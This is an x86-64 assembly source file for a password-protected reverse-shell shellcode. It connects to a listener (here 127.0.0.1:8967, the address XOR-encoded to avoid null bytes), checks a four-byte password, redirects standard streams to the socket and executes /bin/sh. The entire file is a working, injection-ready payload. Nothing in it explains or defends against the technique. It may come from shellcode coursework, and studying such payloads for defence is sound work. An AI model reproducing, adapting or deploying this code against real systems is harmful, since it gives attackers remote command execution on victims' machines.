        BITS 64
        global _start
        section .text

        ;; System call codes (from unistd_64.h)
        SYS_DUP2        equ 0x21        ;__NR_dup2 33
        SYS_SOCKET      equ 0x29        ;__NR_socket 41
        SYS_CONNECT     equ 0x2a        ;__NR_connect 42
        SYS_EXECVE      equ 0x3b        ;__NR_execve 59

        ;; Socket constants
        AF_INET         equ 0x02
        SOCK_STREAM     equ 0x01

        ;; Shellcode constants
        ENCODER         equ 0xaaaaaaaa  ; used to encode the HOST IP to avoid NULL
        HOST            equ 0xabaaaad5  ; 127.0.0.1  in binary, reversed and xored with 0xaa
        PORT            equ 0x0723      ; port 8967 -> 0x2307 then reversed by htons()
        PASSWORD        equ '7698'      ; ascii '7698' then reversed

_start:

socket:
        ;; sockfd = socket(AF_INET, SOCK_STREAM, 0)
        push    SYS_SOCKET
        pop     rax
        push    AF_INET
        pop     rdi
        push    SOCK_STREAM
        pop     rsi
        xor     edx, edx
        syscall

        ;; store sockfd in %rdi
        push    rax
        pop     rdi

sockaddr:
        push    rdx                     ; push 0x0 twice, for 16 empty bytes
        push    rdx                     ; which is the size of sockaddr

        mov     byte [rsp], AF_INET     ; addr.sin_family = AF_INET
        mov     word [rsp+0x2], PORT    ; addr.sin_port = htons(8967)
        mov     eax, HOST
        xor     eax, ENCODER            ; get the original IP (0x0100007f)
        mov     dword [rsp+0x4], eax   ; inet_aton("127.0.0.1", &addr)
        push    rsp
        pop     rsi                     ; get &addr in %rsi

connect:
        ;; connect(sockfd, (struct sockaddr *) &addr, 16)
        push    0x10
        pop     rdx
        push    SYS_CONNECT
        pop     rax
        ;; %rdi already contains sockfd
        syscall

read:
        ;; read(sockfd, void *buf, size)
        xor     eax, eax                ; EAX=0 -> __NR_read 0
        syscall                         ; %rdx = 16 ; %rsi = &sockaddr

        cmp     dword [rsi], PASSWORD
        jne     quit

dup2:
        ;; dup2(sockfd, 0)
        ;; dup2(sockfd, 1)
        ;; dup2(sockfd, 2)
        push    0x3
        pop     rsi
dup2_loop:
        dec     rsi
        push    SYS_DUP2
        pop     rax
        syscall

        jne     dup2_loop

execve:
        ;; execve('//bin/sh', NULL, NULL)
        sub     rdx, rdx
        push    rdx
        push    rdx
        pop     rsi
        mov     rdi, '//bin/sh'
        push    rdi
        push    rsp
        pop     rdi
        push    SYS_EXECVE
        pop     rax
        syscall

quit:
